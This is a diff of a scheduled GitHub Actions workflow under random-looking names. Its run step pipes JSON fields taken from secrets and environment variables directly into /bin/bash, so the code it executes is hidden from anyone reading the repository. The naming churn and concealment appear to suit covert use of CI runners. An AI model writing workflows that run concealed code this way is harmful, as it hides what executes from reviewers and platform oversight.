@@ -2,23 +2,23 @@ name: yanhuidang8765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
+    - cron: '59 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanhuidang8765
         env:
-          n11835: ${{ secrets.n11835 }}
+          jw031: ${{ secrets.jw031 }}
         run: |
-          echo $n11835 | jq -r .vuh4183 | /bin/bash
-          echo $rkxdc0 | jq -r .qzy25 | /bin/bash
-          echo $ikbbs85754 | jq -r .o516 | /bin/bash
-          echo $y3 | jq -r .oiro14932 | /bin/bash
-          echo $aes2 | jq -r .ipa852 | /bin/bash
-          echo $qtryw043 | jq -r .gojz71 | /bin/bash
-          echo $ov0 | jq -r .vs9456 | /bin/bash
-          echo $ctc28 | jq -r .scx2135 | /bin/bash
+          echo $jw031 | jq -r .bc75 | /bin/bash
+          echo $hza85 | jq -r .sll176 | /bin/bash
+          echo $zbi46422 | jq -r .up9307 | /bin/bash
+          echo $xqjyt40438 | jq -r .pkl2971 | /bin/bash
+          echo $i93360 | jq -r .hfjlm5560 | /bin/bash
+          echo $s73280 | jq -r .k49 | /bin/bash
+          echo $kk1064 | jq -r .pdg027 | /bin/bash
 
